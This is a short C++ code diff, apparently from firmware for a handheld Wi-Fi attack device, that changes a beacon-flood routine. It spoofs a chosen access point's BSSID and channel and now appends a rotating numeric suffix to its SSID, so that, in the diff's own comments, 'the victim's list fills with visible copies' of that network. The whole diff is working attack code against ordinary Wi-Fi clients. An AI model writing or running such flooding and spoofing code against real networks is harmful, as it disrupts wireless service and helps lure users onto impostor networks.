@@ -140,10 +140,16 @@ void WifiBeaconAttackScreen::onUpdate()
         render();
       }
     } else {
+      // Clients dedupe APs by SSID, so flooding the bare target name shows as a
+      // single entry (and merges with the real AP). Append a rotating suffix so
+      // the victim's list fills with visible copies of the selected network.
       for (int i = 0; i < 5; i++) {
+        char ssid[33];
+        snprintf(ssid, sizeof(ssid), "%.28s %02d",
+                 _apList[_floodTarget].ssid, _ssidIdx % 32);
+        _ssidIdx++;
         esp_err_t r = _attacker->beaconFlood(
-          _apList[_floodTarget].bssid, _apList[_floodTarget].ssid,
-          _apList[_floodTarget].channel);
+          _apList[_floodTarget].bssid, ssid, _apList[_floodTarget].channel);
         if (r == ESP_OK) _sentThisSec++;
         vTaskDelay(pdMS_TO_TICKS(1));
       }
